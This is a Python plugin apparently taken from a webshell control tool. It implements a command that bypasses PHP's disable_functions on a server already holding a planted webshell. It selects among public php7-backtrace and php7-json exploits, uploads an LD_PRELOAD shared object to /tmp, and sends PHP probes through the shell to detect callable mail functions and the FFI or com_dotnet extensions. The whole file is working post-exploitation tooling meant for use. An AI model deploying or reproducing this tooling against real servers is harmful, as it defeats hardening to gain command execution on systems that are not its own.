from libs.config import alias, color, gget, gset
from os import path, getcwd
from uuid import uuid4
from libs.myapp import is_windows, send
from webshell_plugins.upload import run as upload

mode_to_desc_dict = {0: color.red("closed"), 
                     1: color.green("php7-backtrace"),
                     2: color.green("php7-json"),
                     3: color.green("LD_PRELOAD"),
                     4: color.green("FFI"),
                     5: color.green("COM")}
mode_linux_dict = (3, 4)


def get_detectd_ld_preload():
    return """$a=array('mail','error_log', 'mb_send_mail', 'imap_mail');
$disabled = explode(',', ini_get('disable_functions'));
foreach ($a as $v){
    if (is_callable($v) && !in_array($v, $disabled)){
        echo $v;
        break;
    }
}"""


def get_detectd_ext(extname: str):
    return """if (extension_loaded("%s")){echo "exist";}""" % extname


@alias(True, m="mode")
def run(mode: int = 0):
    """
    bdf

    Try to bypass disable_functions by php7-backtrace-bypass.

    Mode 0:

        close

    Mode 1 php7-backtrace(Only for php7.0-7.4) :

        Origin:
        - https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass

        Targets:
        - 7.0 - all versions to date
        - 7.1 - all versions to date
        - 7.2 - all versions to date
        - 7.3 < 7.3.15 (released 20 Feb 2020)
        - 7.4 < 7.4.3 (released 20 Feb 2020)

    Mode 2 php7-json(Only for php7.1-7.3):

        Origin:
        - https://github.com/mm0r1/exploits/tree/master/php-json-bypass

        Targets:
        - 7.1 - all versions to date
        - 7.2 < 7.2.19 (released 30 May 2019)
        - 7.3 < 7.3.6 (released 30 May 2019)

    Mode 3 LD_PRELOAD(Only for *unix):

        Need:
        - putenv, mail/error_log/mb_send_mail/imap_email fucntions enabled

    Mode 4 FFI(Only for *unix and php >= 7.4):

        Need:
        - FFI extension

    Mode 5 COM(Only for windows):

        Need:
        - com_dotnet extension

    """
    if (mode in mode_to_desc_dict and (mode not in mode_linux_dict or not is_windows())):
        if (mode == 3 and not gget("webshell.ld_preload_path", "webshell", False)):
            disable_func_list = gget("webshell.disable_functions", "webshell")
            filename = "/tmp/%s.so" % str(uuid4())
            upload_result = upload(
                path.join(getcwd(), "auxiliary", "ld_preload_x86_64.so"), filename, True)
            if (not upload_result):
                return
            if ("putenv" in disable_func_list):
                print(color.red("\nputenv is disabled.\n"))
                return
            ld_preload_func = send(get_detectd_ld_preload()).r_text.strip()
            if (not ld_preload_func):
                print(color.red("\nNo ld_preload function!\n"))
                return
            gset("webshell.ld_preload_path", filename, True, "webshell")
            gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
        if (mode == 4):
            res = send(get_detectd_ext("FFI"))
            if (not res):
                return
            text = res.r_text.strip()
            if ("exist" not in text):
                print(color.red("\nNo FFI extension!\n"))
                return
        if (mode == 5):
            res = send(get_detectd_ext("com_dotnet"))
            if (not res):
                return
            text = res.r_text.strip()
            if ("exist" not in text):
                print(color.red("\nNo com_dotnet extension!\n"))
                return
        print(
            f"\nbypass disable_functions: {mode_to_desc_dict[mode]}\n")
        gset("webshell.bypass_df", mode, True, "webshell")
    else:
        print(color.red("\nMode error.\n"))
        return
